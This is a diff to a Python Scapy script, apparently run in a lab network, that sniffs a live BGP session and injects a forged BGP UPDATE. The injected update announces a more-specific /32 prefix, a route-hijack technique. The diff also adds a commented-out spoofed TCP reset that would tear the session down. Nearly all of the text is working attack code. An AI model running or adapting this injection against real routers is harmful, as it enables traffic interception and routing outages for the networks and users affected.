@@ -4,12 +4,14 @@ from scapy.all import *
 load_contrib('bgp')
 
 
-pkt = sniff(iface="br-e0e490b0dc5c",filter="tcp and ip dst 10.1.2.1 and port 179",count=1)
+interface = "br-9dc443750c6b"
+
+pkt = sniff(iface=interface,filter="tcp and ip dst 10.1.2.1 and port 179",count=1)
 
 print("Sniffed:")
 pkt.show()
 
-time.sleep(1)
+time.sleep(0.5)
 
 print("Crafted:")
 
@@ -61,7 +63,7 @@ bgp_update = IP(src=ipsrc, dst=ipdst, ttl=1)\
     /TCP(dport=mydport, sport=mysport, flags="PA", seq=seq_num, ack=ack_num)\
     /BGPHeader(marker=340282366920938463463374607431768211455, type="UPDATE")\
     /BGPUpdate(withdrawn_routes_len=0, \
-    path_attr=[setORIGIN, setAS, setNEXTHOP, setMED], nlri=[BGPNLRI_IPv4(prefix="10.202.4.0/24")])
+    path_attr=[setORIGIN, setAS, setNEXTHOP, setMED], nlri=[BGPNLRI_IPv4(prefix="10.202.4.202/32")])
 
 #Display new packet
 bgp_update.show()
@@ -74,8 +76,12 @@ del bgp_update[BGPUpdate][1][BGPPathAttr].attr_len
 del bgp_update[BGPUpdate][3][BGPPathAttr].attr_len
 del bgp_update[IP].len
 #Send packet into network = frame1 + bgp_update
-sendp(frame1/bgp_update,iface="br-e0e490b0dc5c")
+sendp(frame1/bgp_update,iface=interface)
 
+#reset_pkt = IP(src=ipsrc, dst=ipdst, ttl=1)\
+#    /TCP(dport=mydport, sport=mysport, flags="R", seq=seq_num+55, ack=ack_num)
+#time.sleep(0.1)
+#sendp(frame1/reset_pkt,iface="br-9dc443750c6b")
 
 
 
